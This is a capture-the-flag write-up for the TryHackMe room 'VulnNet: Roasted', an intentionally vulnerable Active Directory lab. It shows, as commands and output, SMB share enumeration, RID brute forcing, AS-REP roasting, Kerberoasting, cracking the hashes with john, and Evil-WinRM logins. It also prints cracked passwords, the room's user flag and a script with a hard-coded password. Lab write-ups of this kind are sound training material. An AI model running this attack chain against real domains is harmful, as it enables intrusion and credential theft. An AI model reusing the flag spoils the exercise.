---
tags:
  - tryhackme
  - challenge
  - easy
  - offensive
  - active-directory
  - windows
  - information-leakage
  - rid-brute-force
  - asp-rep-roast
  - hash-cracking
  - kerberoast
  - hard-coded-credentials
  - pass-the-hash
---

# VulnNet: Roasted
![VulnNet: Roasted logo](logos/vulnnet_roasted_logo.png)

**Platform:** TryHackMe  
**Type:** Challenge  
**Difficulty:** Easy  
**Link:** [VulnNet: Roasted](https://tryhackme.com/room/vulnnetroasted)  

## Description
"VulnNet Entertainment quickly deployed another management instance on their very broad network...

VulnNet Entertainment just deployed a new instance on their network with the newly-hired system administrators. Being a security-aware company, they as always hired you to perform a penetration test, and see how system administrators are performing.  

* Difficulty: Easy  
* Operating System: Windows  

This is a much simpler machine, do not overthink. You can do it by following common methodologies."

## Enumeration
### Port Scanning
```
ports=$(nmap -p- --min-rate=1000 TARGET_IP_ADDRESS | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -A -T4 TARGET_IP_ADDRESS
```
```
Host is up (0.021s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-06-11 21:37:12Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49670/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
49695/tcp open  msrpc         Microsoft Windows RPC
49787/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Microsoft Windows Server 2019 (97%), Microsoft Windows 10 1903 - 22H2 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 3 hops
Service Info: Host: WIN-2BO8M1OE1M1; OS: Windows; CPE: cpe:/o:microsoft:windows
```

**Action(s)**  
:white_check_mark: Add `vulnnet-rst.local` to `/etc/hosts` file

### DNS Enumeration (port 53)
```
dig axfr @TARGET_IP_ADDRESS vulnnet-rst.local

; <<>> DiG 9.20.23-1-Debian <<>> axfr @10.129.175.202 vulnnet-rst.local
; (1 server found)
;; global options: +cmd
; Transfer failed.

```

### SMB Enumeration (port 139/445)
```
smbclient -N -L \\\\TARGET_IP_ADDRESS     

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
        VulnNet-Business-Anonymous Disk      VulnNet Business Sharing
        VulnNet-Enterprise-Anonymous Disk      VulnNet Enterprise Sharing
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to TARGET_IP_ADDRESS failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

smbclient -N \\\\TARGET_IP_ADDRESS\\ADMIN$
tree connect failed: NT_STATUS_ACCESS_DENIED
                                                                        
smbclient -N \\\\TARGET_IP_ADDRESS\\C$    
tree connect failed: NT_STATUS_ACCESS_DENIED
                                                                        
smbclient -N \\\\TARGET_IP_ADDRESS\\IPC$
Try "help" to get a list of possible commands.
smb: \> dir
NT_STATUS_NO_SUCH_FILE listing \*
smb: \> exit
                                                                        
smbclient -N \\\\TARGET_IP_ADDRESS\\NETLOGON
Try "help" to get a list of possible commands.
smb: \> dir
NT_STATUS_ACCESS_DENIED listing \*
smb: \> exit
                                                                        
smbclient -N \\\\TARGET_IP_ADDRESS\\SYSVOL  
Try "help" to get a list of possible commands.
smb: \> dir
NT_STATUS_ACCESS_DENIED listing \*
smb: \> exit
                                                                        
smbclient -N \\\\TARGET_IP_ADDRESS\\VulnNet-Business-Anonymous
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Fri Mar 12 21:46:40 2021
  ..                                  D        0  Fri Mar 12 21:46:40 2021
  Business-Manager.txt                A      758  Thu Mar 11 20:24:34 2021
  Business-Sections.txt               A      654  Thu Mar 11 20:24:34 2021
  Business-Tracking.txt               A      471  Thu Mar 11 20:24:34 2021

                8771839 blocks of size 4096. 4515312 blocks available
smb: \> get Business-Manager.txt
getting file \Business-Manager.txt of size 758 as Business-Manager.txt (2.3 KiloBytes/sec) (average 2.3 KiloBytes/sec)
smb: \> get Business-Sections.txt
getting file \Business-Sections.txt of size 654 as Business-Sections.txt (4.2 KiloBytes/sec) (average 2.9 KiloBytes/sec)
smb: \> get Business-Tracking.txt
getting file \Business-Tracking.txt of size 471 as Business-Tracking.txt (4.1 KiloBytes/sec) (average 3.1 KiloBytes/sec)
smb: \> exit
                                                                        
smbclient -N \\\\TARGET_IP_ADDRESS\\VulnNet-Enterprise-Anonymous
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Fri Mar 12 21:46:40 2021
  ..                                  D        0  Fri Mar 12 21:46:40 2021
  Enterprise-Operations.txt           A      467  Thu Mar 11 20:24:34 2021
  Enterprise-Safety.txt               A      503  Thu Mar 11 20:24:34 2021
  Enterprise-Sync.txt                 A      496  Thu Mar 11 20:24:34 2021

                8771839 blocks of size 4096. 4515312 blocks available
smb: \> get Enterprise-Operations.txt
getting file \Enterprise-Operations.txt of size 467 as Enterprise-Operations.txt (3.8 KiloBytes/sec) (average 3.8 KiloBytes/sec)
smb: \> get Enterprise-Safety.txt
getting file \Enterprise-Safety.txt of size 503 as Enterprise-Safety.txt (3.7 KiloBytes/sec) (average 3.7 KiloBytes/sec)
smb: \> get Enterprise-Sync.txt
getting file \Enterprise-Sync.txt of size 496 as Enterprise-Sync.txt (4.6 KiloBytes/sec) (average 4.0 KiloBytes/sec)
smb: \> exit
                                                                        
cat Business-Manager.txt      
VULNNET BUSINESS
~~~~~~~~~~~~~~~~~~~

Alexa Whitehat is our core business manager. All business-related offers, campaigns, and advertisements should be directed to her. 
We understand that when you’ve got questions, especially when you’re on a tight proposal deadline, you NEED answers. 
Our customer happiness specialists are at the ready, armed with friendly, helpful, timely support by email or online messaging.
We’re here to help, regardless of which you plan you’re on or if you’re just taking us for a test drive.
Our company looks forward to all of the business proposals, we will do our best to evaluate all of your offers properly. 
To contact our core business manager call this number: 1337 0000 7331

~VulnNet Entertainment
~TryHackMe
                                                                        
cat Business-Sections.txt 
VULNNET BUSINESS
~~~~~~~~~~~~~~~~~~~

Jack Goldenhand is the person you should reach to for any business unrelated proposals.
Managing proposals is a breeze with VulnNet. We save all your case studies, fees, images and team bios all in one central library.
Tag them, search them and drop them into your layout. Proposals just got... dare we say... fun?
No more emailing big PDFs, printing and shipping proposals or faxing back signatures (ugh).
Your client gets a branded, interactive proposal they can sign off electronically. No need for extra software or logins.
Oh, and we tell you as soon as your client opens it.

~VulnNet Entertainment
~TryHackMe
                                                                        
cat Business-Tracking.txt 
VULNNET TRACKING
~~~~~~~~~~~~~~~~~~

Keep a pulse on your sales pipeline of your agency. We let you know your close rate,
which sections of your proposals get viewed and for how long,
and all kinds of insight into what goes into your most successful proposals so you can sell smarter.
We keep track of all necessary activities and reach back to you with newly gathered data to discuss the outcome. 
You won't miss anything ever again. 

~VulnNet Entertainment
~TryHackMe
                                        
cat Enterprise-Operations.txt 
VULNNET OPERATIONS
~~~~~~~~~~~~~~~~~~~~

We bring predictability and consistency to your process. Making it repetitive doesn’t make it boring. 
Set the direction, define roles, and rely on automation to keep reps focused and make onboarding a breeze.
Don't wait for an opportunity to knock - build the door. Contact us right now.
VulnNet Entertainment is fully commited to growth, security and improvement.
Make a right decision!

~VulnNet Entertainment
~TryHackMe
                                                                        
cat Enterprise-Safety.txt    
VULNNET SAFETY
~~~~~~~~~~~~~~~~

Tony Skid is a core security manager and takes care of internal infrastructure.
We keep your data safe and private. When it comes to protecting your private information...
we’ve got it locked down tighter than Alcatraz. 
We partner with TryHackMe, use 128-bit SSL encryption, and create daily backups. 
And we never, EVER disclose any data to third-parties without your permission. 
Rest easy, nothing’s getting out of here alive.

~VulnNet Entertainment
~TryHackMe

cat Enterprise-Sync.txt  
VULNNET SYNC
~~~~~~~~~~~~~~

Johnny Leet keeps the whole infrastructure up to date and helps you sync all of your apps.
Proposals are just one part of your agency sales process. We tie together your other software, so you can import contacts from your CRM,
auto create deals and generate invoices in your accounting software. We are regularly adding new integrations.
Say no more to desync problems.
To contact our sync manager call this number: 7331 0000 1337

~VulnNet Entertainment
~TryHackMe
```

**Action(s)**  
:white_check_mark: Add names found in SMB documents to a `users.txt` file for possible user against the LDAP service (ASP-REP)

```
# users.txt
alexa
alexawhitehat
alexa.whitehat
awhitehat
a.whitehat
jack
jackgoldenhand
jack.goldenhand
jgoldenhan
j.goldenhand
tony
tonyskid
tony.skid
tskid
t.skid
johnny
johnnyleet
johnny.leet
jleet
j.leet
```

### LDAP Enumeration (port 389)
```
ldapsearch -x -H ldap://TARGET_IP_ADDRESS -D '' -w '' -b "DC=vulnnet-rst,DC=local"
# extended LDIF
#
# LDAPv3
# base <DC=vulnnet-rst,DC=local> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# search result
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090A5C, comment: In order to perform this opera
 tion a successful bind must be completed on the connection., data 0, v4563

# numResponses: 1
```

## Foothold
### ASP-REP Roast attempt with `users.txt`
```
impacket-GetNPUsers vulnnet-rst.local/ -usersfile users.txt -dc-ip TARGET_IP_ADDRESS -no-pass	# No valid users
```
### RID Brute Forcing
```
crackmapexec smb 'TARGET_IP_ADDRESS' -u 'a' -p '' -d 'vulnnet-rst.local' --rid-brute
SMB         10.129.151.44   445    WIN-2BO8M1OE1M1  [*] Windows 10 / Server 2019 Build 17763 x64 (name:WIN-2BO8M1OE1M1) (domain:vulnnet-rst.local) (signing:True) (SMBv1:False)
SMB         10.129.151.44   445    WIN-2BO8M1OE1M1  [+] vulnnet-rst.local\a: 
SMB         10.129.151.44   445    WIN-2BO8M1OE1M1  [+] Brute forcing RIDs
SMB         10.129.151.44   445    WIN-2BO8M1OE1M1  498: VULNNET-RST\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.151.44   445    WIN-2BO8M1OE1M1  500: VULNNET-RST\Administrator (SidTypeUser)
SMB         10.129.151.44   445    WIN-2BO8M1OE1M1  501: VULNNET-RST\Guest (SidTypeUser)
SMB         10.129.151.44   445    WIN-2BO8M1OE1M1  502: VULNNET-RST\krbtgt (SidTypeUser)
SMB         10.129.151.44   445    WIN-2BO8M1OE1M1  512: VULNNET-RST\Domain Admins (SidTypeGroup)
SMB         10.129.151.44   445    WIN-2BO8M1OE1M1  513: VULNNET-RST\Domain Users (SidTypeGroup)
SMB         10.129.151.44   445    WIN-2BO8M1OE1M1  514: VULNNET-RST\Domain Guests (SidTypeGroup)
SMB         10.129.151.44   445    WIN-2BO8M1OE1M1  515: VULNNET-RST\Domain Computers (SidTypeGroup)
SMB         10.129.151.44   445    WIN-2BO8M1OE1M1  516: VULNNET-RST\Domain Controllers (SidTypeGroup)
SMB         10.129.151.44   445    WIN-2BO8M1OE1M1  517: VULNNET-RST\Cert Publishers (SidTypeAlias)
SMB         10.129.151.44   445    WIN-2BO8M1OE1M1  518: VULNNET-RST\Schema Admins (SidTypeGroup)
SMB         10.129.151.44   445    WIN-2BO8M1OE1M1  519: VULNNET-RST\Enterprise Admins (SidTypeGroup)
SMB         10.129.151.44   445    WIN-2BO8M1OE1M1  520: VULNNET-RST\Group Policy Creator Owners (SidTypeGroup)
SMB         10.129.151.44   445    WIN-2BO8M1OE1M1  521: VULNNET-RST\Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.151.44   445    WIN-2BO8M1OE1M1  522: VULNNET-RST\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.129.151.44   445    WIN-2BO8M1OE1M1  525: VULNNET-RST\Protected Users (SidTypeGroup)
SMB         10.129.151.44   445    WIN-2BO8M1OE1M1  526: VULNNET-RST\Key Admins (SidTypeGroup)
SMB         10.129.151.44   445    WIN-2BO8M1OE1M1  527: VULNNET-RST\Enterprise Key Admins (SidTypeGroup)
SMB         10.129.151.44   445    WIN-2BO8M1OE1M1  553: VULNNET-RST\RAS and IAS Servers (SidTypeAlias)
SMB         10.129.151.44   445    WIN-2BO8M1OE1M1  571: VULNNET-RST\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.129.151.44   445    WIN-2BO8M1OE1M1  572: VULNNET-RST\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.129.151.44   445    WIN-2BO8M1OE1M1  1000: VULNNET-RST\WIN-2BO8M1OE1M1$ (SidTypeUser)
SMB         10.129.151.44   445    WIN-2BO8M1OE1M1  1101: VULNNET-RST\DnsAdmins (SidTypeAlias)
SMB         10.129.151.44   445    WIN-2BO8M1OE1M1  1102: VULNNET-RST\DnsUpdateProxy (SidTypeGroup)
SMB         10.129.151.44   445    WIN-2BO8M1OE1M1  1104: VULNNET-RST\enterprise-core-vn (SidTypeUser)
SMB         10.129.151.44   445    WIN-2BO8M1OE1M1  1105: VULNNET-RST\a-whitehat (SidTypeUser)
SMB         10.129.151.44   445    WIN-2BO8M1OE1M1  1109: VULNNET-RST\t-skid (SidTypeUser)
SMB         10.129.151.44   445    WIN-2BO8M1OE1M1  1110: VULNNET-RST\j-goldenhand (SidTypeUser)
SMB         10.129.151.44   445    WIN-2BO8M1OE1M1  1111: VULNNET-RST\j-leet (SidTypeUser)
```
**Action(s)**  
:white_check_mark: Update `users.txt` with discovered valid user names

### ASP-REP Roast attempt with updated `users.txt`
```
impacket-GetNPUsers vulnnet-rst.local/ -usersfile users.txt -dc-ip 10.129.151.44 -no-pass
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] User administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User guest doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User enterprise-core-vn doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User a-whitehat doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User j-goldenhand doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$t-skid@VULNNET-RST.LOCAL:60a59123a75f6a848ce0ba543733d400$6ec3e658cb757f229bee306c85170f7d8dc0f2d8dc8fb68a7b5928faf78c45258f816f1c16f75b71ebfb88289a3d2ceab1fe49b7cf8354ef4e888fc3d59150074c1dc243138be0d0eca3c7ee4e515ddeb16aee10ff0f57f2b9a3a9064d80d86b915aa7b88b931472031f6b6ebd75f0461545feb6ebad652d3c39dee3bdcdf9cacc71a625a1d6c25318283223937d9c3cfb89ac44a6d968902bc294dbff6c3a668e1dfc905e5b20228efacf8b75df6594cbf214c646376fdcbab7b44dd13e8cccf48b90e20843a65006f9cf7f619a19b0a7bae12f5c15f80279d6925be41387f8f4fedfbb7b1b1d4aa6ce87ece1721c11eabc5de29e40
[-] User j-leet doesn't have UF_DONT_REQUIRE_PREAUTH set
```

### Hash cracking
```
echo '$krb5asrep$23$t-skid@VULNNET-RST.LOCAL:60a59123a75f6a848ce0ba543733d400$6ec3e658cb757f229bee306c85170f7d8dc0f2d8dc8fb68a7b5928faf78c45258f816f1c16f75b71ebfb88289a3d2ceab1fe49b7cf8354ef4e888fc3d59150074c1dc243138be0d0eca3c7ee4e515ddeb16aee10ff0f57f2b9a3a9064d80d86b915aa7b88b931472031f6b6ebd75f0461545feb6ebad652d3c39dee3bdcdf9cacc71a625a1d6c25318283223937d9c3cfb89ac44a6d968902bc294dbff6c3a668e1dfc905e5b20228efacf8b75df6594cbf214c646376fdcbab7b44dd13e8cccf48b90e20843a65006f9cf7f619a19b0a7bae12f5c15f80279d6925be41387f8f4fedfbb7b1b1d4aa6ce87ece1721c11eabc5de29e40' > hash
                                                                        john hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 512/512 AVX512BW 16x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
tj072889*        ($krb5asrep$23$t-skid@VULNNET-RST.LOCAL)     
1g 0:00:00:02 DONE (2026-06-12 06:12) 0.4975g/s 1581Kp/s 1581Kc/s 1581KC/s tjgurule2..tj0216044
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

### WinRM connection attempt as "t-skid" (unsuccessful)
```
evil-winrm -i TARGET_IP_ADDRESS -u t-skid -p 'tj072889*'
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\> dir
                                        
Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError
                                        
Error: Exiting with code 1
```

### Get Service Principal Names/Kerberoast
```
impacket-GetUserSPNs -dc-ip TARGET_IP_ADDRESS 'vulnnet-rst.local/t-skid:tj072889*' -request
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName    Name                MemberOf                                                       PasswordLastSet             LastLogon                   Delegation 
----------------------  ------------------  -------------------------------------------------------------  --------------------------  --------------------------  ----------
CIFS/vulnnet-rst.local  enterprise-core-vn  CN=Remote Management Users,CN=Builtin,DC=vulnnet-rst,DC=local  2021-03-11 14:45:09.913979  2021-03-13 18:41:17.987528             



[-] CCache file is not found. Skipping...
$krb5tgs$23$*enterprise-core-vn$VULNNET-RST.LOCAL$vulnnet-rst.local/enterprise-core-vn*$c3cb1e1c93c5730c72ec18c3e3525a80$1997affeeb712b57b11cf9270cd622881c79f63d5ceb3a2987355bac91a478870d17d2dbd521171bee3b4cc31caed517913905d7bb958d94064541163472be3eb9b8d156b81ca22852b228f1c8ed62d429af1bf38f2877b0f634c8d85c73387425de368c50402288f770bcaa8ec50ac89483b62da0e6aa6cd1b5c5480cb86dfa1ee27a4c7ff89b11ac2daf9eb1f003603d1d94a57a3e9196d7248d6f79e4ea70f9d2e62f81cc7a3c43870e29c82e510ba59ed51dae93ed24ba64dbe9cb9da15b2ae5e6e6a5217adc4d0e941e3dbd4f7cb02286abf7142962f72a7d18c24bbd91ed28ca29f0a921465247d5066066f75b2baae0185393626a2f553f44fcfebbe5a2464193fb175e10b58c10aeac0b93356d520e12950158d746ecc3e6eb6af286c3f9cdc48dbfcb08105a2910247055fb8988eba1abb535efc42c9363a0821f9e449eb02ac1c4d25bbf11fddc7d6bf5ec131d6c619e7a54b0fc3379d7297fe8273b5ac20eb205c04530731a9f909c536db0065b0a9d1e458bf7613f7df645e1415d876b836e048ff972c685056a29e78cfa5dd27c22ac859432397ac1cde13428fb452cc2d66aae501c76c135ae946a895b9ae0051b33574ffc9a99735d01b8286fcf0d0c81ca5bb48dfcc0c410a8bfbc39e8ff3a96ce0743819106bce27e23b5bd4717efbc2bb361b0f7a7bcabd24d69ebdf9756f441400a4952afbb1e72311b84f0b0dc77d60e90a558cb8a6d8c31f90da46efb46eea1c2cb7a04fe450fac24364730bc8d2615b4d85909e03072bbd947137b0c4bb4406884124828639986a6e9eddd1c9ab253d8936d46c60bdf718bb28a1fc3a8526359abf3ee1d1f7ef88356b8fcb91571d2dbbc053d2775ea792561baadb3564e3f66077f029c664a123301c81ae4825fc5407f85bdc45eec1c1b38c9e1dffdf4697898915329098d6062d325e87c210a93dbf40fbbe10573beaefd42d3bf8e5d1edfb26b09742f463695bfb8babd60589c26f2bd3cf78aa4d711debd2dd150a318ab45cf637099562cebace90caa21058ac71bae8c75454c9209d93d3bc508785f7f94cac4ab6020d1d0268e7702cbb9936da230582edd7eea3c88e983904dda03cb2ac2e8f61a07ac3d9693a5e067407d44e7889c94ef8de129441ff6949a3d9cac3b5630229a23b0b69b8e006ebae4f6b60421ee004b717f1d5daf7c849500044e396d8302d59cbe8f11db8b7be6f00e5b1c4f429bd5277776f16fd58bb5b09116cffbe2feef4d6f27a8e8a66778e7b9b72127460b814faa52662d1c42ee1382c75e87407db01bf83a7d737720b23322e855ef011838a9701eb9b8d5b83b17d61e0111d89c29a9e5fe0805c5daa8997788768a8bceca2dd8d2884c897a0b5025c0c9cbc06559

echo '$krb5tgs$23$*enterprise-core-vn$VULNNET-RST.LOCAL$vulnnet-rst.local/enterprise-core-vn*$c3cb1e1c93c5730c72ec18c3e3525a80$1997affeeb712b57b11cf9270cd622881c79f63d5ceb3a2987355bac91a478870d17d2dbd521171bee3b4cc31caed517913905d7bb958d94064541163472be3eb9b8d156b81ca22852b228f1c8ed62d429af1bf38f2877b0f634c8d85c73387425de368c50402288f770bcaa8ec50ac89483b62da0e6aa6cd1b5c5480cb86dfa1ee27a4c7ff89b11ac2daf9eb1f003603d1d94a57a3e9196d7248d6f79e4ea70f9d2e62f81cc7a3c43870e29c82e510ba59ed51dae93ed24ba64dbe9cb9da15b2ae5e6e6a5217adc4d0e941e3dbd4f7cb02286abf7142962f72a7d18c24bbd91ed28ca29f0a921465247d5066066f75b2baae0185393626a2f553f44fcfebbe5a2464193fb175e10b58c10aeac0b93356d520e12950158d746ecc3e6eb6af286c3f9cdc48dbfcb08105a2910247055fb8988eba1abb535efc42c9363a0821f9e449eb02ac1c4d25bbf11fddc7d6bf5ec131d6c619e7a54b0fc3379d7297fe8273b5ac20eb205c04530731a9f909c536db0065b0a9d1e458bf7613f7df645e1415d876b836e048ff972c685056a29e78cfa5dd27c22ac859432397ac1cde13428fb452cc2d66aae501c76c135ae946a895b9ae0051b33574ffc9a99735d01b8286fcf0d0c81ca5bb48dfcc0c410a8bfbc39e8ff3a96ce0743819106bce27e23b5bd4717efbc2bb361b0f7a7bcabd24d69ebdf9756f441400a4952afbb1e72311b84f0b0dc77d60e90a558cb8a6d8c31f90da46efb46eea1c2cb7a04fe450fac24364730bc8d2615b4d85909e03072bbd947137b0c4bb4406884124828639986a6e9eddd1c9ab253d8936d46c60bdf718bb28a1fc3a8526359abf3ee1d1f7ef88356b8fcb91571d2dbbc053d2775ea792561baadb3564e3f66077f029c664a123301c81ae4825fc5407f85bdc45eec1c1b38c9e1dffdf4697898915329098d6062d325e87c210a93dbf40fbbe10573beaefd42d3bf8e5d1edfb26b09742f463695bfb8babd60589c26f2bd3cf78aa4d711debd2dd150a318ab45cf637099562cebace90caa21058ac71bae8c75454c9209d93d3bc508785f7f94cac4ab6020d1d0268e7702cbb9936da230582edd7eea3c88e983904dda03cb2ac2e8f61a07ac3d9693a5e067407d44e7889c94ef8de129441ff6949a3d9cac3b5630229a23b0b69b8e006ebae4f6b60421ee004b717f1d5daf7c849500044e396d8302d59cbe8f11db8b7be6f00e5b1c4f429bd5277776f16fd58bb5b09116cffbe2feef4d6f27a8e8a66778e7b9b72127460b814faa52662d1c42ee1382c75e87407db01bf83a7d737720b23322e855ef011838a9701eb9b8d5b83b17d61e0111d89c29a9e5fe0805c5daa8997788768a8bceca2dd8d2884c897a0b5025c0c9cbc06559' > krb_hash

john krb_hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
ry=ibfkfv,s6h,   (?)     
1g 0:00:00:01 DONE (2026-06-12 07:07) 0.6250g/s 2567Kp/s 2567Kc/s 2567KC/s ryan2lauren..ry=iIyD{N
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

### Evil-WinRM connection attempt as "enterprise-core-vn"
```
evil-winrm -i TARGET_IP_ADDRESS -u enterprise-core-vn -p 'ry=ibfkfv,s6h,'
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\enterprise-core-vn\Documents> cd ..
*Evil-WinRM* PS C:\Users\enterprise-core-vn> cd Desktop
*Evil-WinRM* PS C:\Users\enterprise-core-vn\Desktop> dir


    Directory: C:\Users\enterprise-core-vn\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        3/13/2021   3:43 PM             39 user.txt


*Evil-WinRM* PS C:\Users\enterprise-core-vn\Desktop> type user.txt
```
??? success "What is the user flag? (Desktop\user.txt)"
	THM{726b7c0baaac1455d05c827b5561f4ed}

## Privilege Escalation
**Notes**  

* WinPEAS.bat uploaded and run: no useful information
* `whoami /priv` and `whoami /groups`: no useful assets

**Action(s)**  
:white_check_mark: Return to enumeration of SMB shares with known good credentials for valid user ("t-skid")

```
smbclient -U 'vulnnet-rst\t-skid'  \\\\TARGET_IP_ADDRESS\\ADMIN$  
Password for [VULNNET-RST\t-skid]:
tree connect failed: NT_STATUS_ACCESS_DENIED

smbclient -U 'vulnnet-rst\t-skid'  \\\\TARGET_IP_ADDRESS\\C$    
Password for [VULNNET-RST\t-skid]:
tree connect failed: NT_STATUS_ACCESS_DENIED

smbclient -U 'vulnnet-rst\t-skid'  \\\\TARGET_IP_ADDRESS\\IPC$
Password for [VULNNET-RST\t-skid]:
Try "help" to get a list of possible commands.
smb: \> dir
NT_STATUS_NO_SUCH_FILE listing \*
smb: \> exit

smbclient -U 'vulnnet-rst\t-skid'  \\\\TARGET_IP_ADDRESS\\NETLOGON
Password for [VULNNET-RST\t-skid]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Tue Mar 16 19:15:49 2021
  ..                                  D        0  Tue Mar 16 19:15:49 2021
  ResetPassword.vbs                   A     2821  Tue Mar 16 19:18:14 2021

                8771839 blocks of size 4096. 4503706 blocks available
smb: \> get ResetPassword.vbs
getting file \ResetPassword.vbs of size 2821 as ResetPassword.vbs (2.1 KiloBytes/sec) (average 2.1 KiloBytes/sec)

cat ResetPassword.vbs                            
Option Explicit

Dim objRootDSE, strDNSDomain, objTrans, strNetBIOSDomain
Dim strUserDN, objUser, strPassword, strUserNTName

' Constants for the NameTranslate object.
Const ADS_NAME_INITTYPE_GC = 3
Const ADS_NAME_TYPE_NT4 = 3
Const ADS_NAME_TYPE_1779 = 1

If (Wscript.Arguments.Count <> 0) Then
    Wscript.Echo "Syntax Error. Correct syntax is:"
    Wscript.Echo "cscript ResetPassword.vbs"
    Wscript.Quit
End If

strUserNTName = "a-whitehat"
strPassword = "bNdKVkjv3RR9ht"

' Determine DNS domain name from RootDSE object.
Set objRootDSE = GetObject("LDAP://RootDSE")
strDNSDomain = objRootDSE.Get("defaultNamingContext")

' Use the NameTranslate object to find the NetBIOS domain name from the
' DNS domain name.
Set objTrans = CreateObject("NameTranslate")
objTrans.Init ADS_NAME_INITTYPE_GC, ""
objTrans.Set ADS_NAME_TYPE_1779, strDNSDomain
strNetBIOSDomain = objTrans.Get(ADS_NAME_TYPE_NT4)
' Remove trailing backslash.
strNetBIOSDomain = Left(strNetBIOSDomain, Len(strNetBIOSDomain) - 1)

' Use the NameTranslate object to convert the NT user name to the
' Distinguished Name required for the LDAP provider.
On Error Resume Next
objTrans.Set ADS_NAME_TYPE_NT4, strNetBIOSDomain & "\" & strUserNTName
If (Err.Number <> 0) Then
    On Error GoTo 0
    Wscript.Echo "User " & strUserNTName _
        & " not found in Active Directory"
    Wscript.Echo "Program aborted"
    Wscript.Quit
End If
strUserDN = objTrans.Get(ADS_NAME_TYPE_1779)
' Escape any forward slash characters, "/", with the backslash
' escape character. All other characters that should be escaped are.
strUserDN = Replace(strUserDN, "/", "\/")

' Bind to the user object in Active Directory with the LDAP provider.
On Error Resume Next
Set objUser = GetObject("LDAP://" & strUserDN)
If (Err.Number <> 0) Then
    On Error GoTo 0
    Wscript.Echo "User " & strUserNTName _
        & " not found in Active Directory"
    Wscript.Echo "Program aborted"
    Wscript.Quit
End If
objUser.SetPassword strPassword
If (Err.Number <> 0) Then
    On Error GoTo 0
    Wscript.Echo "Password NOT reset for " &vbCrLf & strUserNTName
    Wscript.Echo "Password " & strPassword & " may not be allowed, or"
    Wscript.Echo "this client may not support a SSL connection."
    Wscript.Echo "Program aborted"
    Wscript.Quit
Else
    objUser.AccountDisabled = False
    objUser.Put "pwdLastSet", 0
    Err.Clear
    objUser.SetInfo
    If (Err.Number <> 0) Then
        On Error GoTo 0
        Wscript.Echo "Password reset for " & strUserNTName
        Wscript.Echo "But, unable to enable account or expire password"
        Wscript.Quit
    End If
End If
On Error GoTo 0

Wscript.Echo "Password reset, account enabled,"
